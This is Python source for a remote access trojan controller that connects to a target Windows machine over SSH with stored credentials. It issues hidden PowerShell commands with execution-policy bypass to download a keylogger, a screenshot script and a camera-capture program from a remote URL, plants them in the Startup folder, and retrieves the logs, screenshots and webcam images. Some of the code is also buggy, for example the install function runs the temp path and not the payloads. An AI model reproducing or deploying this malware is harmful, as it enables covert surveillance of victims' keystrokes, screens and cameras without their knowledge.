import os
import sys
import getpass
import random as r
from datetime import datetime

banner = """
|\  \|\  \|\   __  \|\   ____\|\  \|\  \ |\  ___ \ |\   __  \    
\ \  \\\  \ \  \|\  \ \  \___|\ \  \/  /|\ \   __/|\ \  \|\  \   
 \ \   __  \ \   __  \ \  \    \ \   ___  \ \  \_|/_\ \   _  _\  
  \ \  \ \  \ \  \ \  \ \  \____\ \  \\ \  \ \  \_|\ \ \  \\  \| 
   \ \__\ \__\ \__\ \__\ \_______\ \__\\ \__\ \_______\ \__\\ _\ 
    \|__|\|__|\|__|\|__|\|_______|\|__| \|__|\|_______|\|__|\|__|
"""

help_menu = """
        [+] Arguments:
            <username>.rat ------------ Access Target Via Config File
            -d, --dfig <vps_user> ----- Download RAT Config File 
            -u, --update -------------- Update RAT
            -r, --remove -------------- Uninstall RAT
            -h, --help  --------------- Help Menu

        [+] Example:
            main.py bluecosmo.rat
"""

options_menu = """
 [+] Command and Control:
            [0] -------------- Connect Command Line 
            [1] ---------- Install Payloads to Target (Keylogger, Screenshot, Camera)
            [2] ----------------- Run KeyLogger
            [3] --------------- Take file Keylogger (.log)
            [4] --- Run Screenshot
            [5] -- Take file screenshot (.png)
            [6] ---------------- Run Camera
            [7] --------------- Take picture (.bmp)
            [8] ------------- Restart PC target

        [+] Payloads:
            Coming Soon...

        [+] Options:
            [help] ------------------- Help Menu
            [man] -------------------- Onlyrat Manual
            [config] ----------------- Display RAT File
            [version] ---------------- Version Number
            [update] ----------------- Update OnlyRAT
            [uninstall] -------------- Uninstall OnlyRAT
            [quit] ------------------- Quit

            * any other commands will be 
              sent through your terminal

        [*] Select an [option]...
"""
username = getpass.getuser()
header = f"[~] {username}@toolhacking $:"

    
def run_command(address, username, password, command):
    os.system(f"sshpass -p \"{password}\" ssh {username}@{address} '{command}'")
    
def payloads(address, username, password, temp):
    print("[*] Starting install payloads ...")
    payload_keylogger = f"powershell powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass \"Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/huynh044/RATProject/main/key_logger/payloads/keylogger.ps1' -OutFile '{temp}\happy\system.ps1'\""
    payload_screenshot = f"powershell powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass \"Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/huynh044/RATProject/main/key_logger/payloads/screenshot.ps1' -OutFile '{temp}\happy\system32.ps1'\""
    payload_screenshot = f"powershell powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass \"Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/huynh044/RATProject/main/key_logger/payloads/CommandCam.exe' -OutFile '{temp}\happy\system.exe'\""
    run_command(address, username, password, temp)
    print("[+] Install Successful ...")


def run_control_keylogger(address, username, password, temp, startup):
    print("[*] Starting run control keylogger ...")
    control = f"cd {startup} && echo 'start /MIN powershell powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass {temp}\happy\system.ps1' > system.cmd"
    run_command(address, username, password, control)
    run_control = f"cd {startup} && start /MIN powershell powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass ./system.cmd"
    run_command(address, username, password, run_control)
    print("[+] Keylogger running ...")

def take_file_log(address, username, password, path):
    # file output *.log
    os.system(f"sshpass -p \"{password}\" scp {username}.log {username}@{address}:{path}/sad")
    
def screenshot(address, username, password, temp, startup):
    print("[*] Starting run control screenshot ...")
    control = f"cd {startup} && echo 'start /MIN powershell powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass {temp}\happy\system32.ps1' > system.cmd"
    run_command(address, username, password, control)
    run_control = f"cd {startup} && start /MIN powershell powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass ./system.cmd"
    run_command(address, username, password, run_control)
    print("[+] Screenshot running ...")
    
def take_screenshot(address, username, password, path):
    os.system(f"sshpass -p \"{password}\" scp happy.png {username}@{address}:{path}/sad")

def control_camera(address, username, password, temp, startup):
    print("[*] Starting control camera ...")
    control = f"cd {startup} && echo 'start /MIN powershell powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass {temp}\happy\system.exe' > system.cmd"
    run_command(address, username, password, control)
    run_control = f"cd {startup} && start /MIN powershell powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass ./system.cmd"
    run_command(address, username, password, run_control)
    print("[+] Started camera . . .")

def take_camera_picture(address, username, password, path):
    os.system(f"sshpass -p \"{password}\" scp image.bmp {username}@{address}:{path}/happy")
    
def terminated():
    return

def read_config_file(config_file):
    config_json = {}
    read_file = open(config_file, "r").readlines()
    
    config_json["IPADDRESS"] = read_file[0]
    config_json["USERNAME"] = read_file[1]
    config_json["PASSWORD"] = read_file[2]
    config_json["WOKING_TEMP"] = read_file[3]
    config_json["WOKING_STARTUP"] = read_file[4]

    return config_json

def os_detection(address, username, password):
    os_name = os.system(f"sshpass -p \"{password}\" ssh {username}@{address} '(Get-WmiObject Win32_OperatingSystem).Caption'")
    return os_name

def connect(address, username, password):
    os.system(f"sshpass -p \"{password}\" ssh {username}@{address}")
    
def restart_pc(address, username, password):
    os.system(f"sshpass -p \"{password}\" ssh {username}@{address} 'shutdown /r'")
    

def cli(args): 
    print(banner)
    
    if args.endswith(".rat"):
        config_json = read_config_file(args)
        IPADDRESS = config_json["IPADDRESS"]
        PASSWORD = config_json["PASSWORD"]
        USERNAME = config_json['USERNAME']
        TEMP = config_json["WOKING_TEMP"]
        STARTUP = config_json["WOKING_STARTUP"]
        while(True):
            options = input(f"{header}")
            if options == "help":
                print(help_menu)
            elif options == "quit":
                terminated()
            elif options == "0":
                connect(IPADDRESS, USERNAME, PASSWORD)
            elif options == "1":
                payloads(IPADDRESS, USERNAME, PASSWORD, TEMP)
            elif options == '2':
                run_control_keylogger(IPADDRESS, USERNAME, PASSWORD, TEMP, STARTUP)
            elif options == "3":
                take_file_log(IPADDRESS, USERNAME,PASSWORD, TEMP)
            elif options == "4":
                screenshot(IPADDRESS, USERNAME, PASSWORD, TEMP, STARTUP)
            elif options == "5":
                take_screenshot(IPADDRESS, USERNAME, PASSWORD, TEMP)
            elif options == "6":
                control_camera(IPADDRESS, USERNAME, PASSWORD, TEMP, STARTUP)
            elif options == "7":
                take_camera_picture(IPADDRESS, USERNAME, PASSWORD, TEMP)
            elif options == "8":
                restart_pc(IPADDRESS, USERNAME, PASSWORD)
    elif args in ["-h", "-help"]:
        print(help_menu)
        
        
def main():
    try:
        sys.argv[1]
    except IndexError:
        print(help_menu)
    else:
        cli(sys.argv[1])
if __name__ == "__main__":
    main()
